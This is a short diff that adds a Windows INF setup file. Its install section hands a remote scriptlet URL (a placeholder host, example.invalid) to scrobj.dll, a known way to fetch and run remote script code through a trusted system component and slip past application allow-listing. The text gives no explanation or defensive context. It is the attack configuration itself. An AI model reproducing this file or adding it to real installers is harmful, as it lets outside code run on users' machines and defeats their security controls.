@@ -1,0 +1,8 @@
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,http://example.invalid/x.sct
+
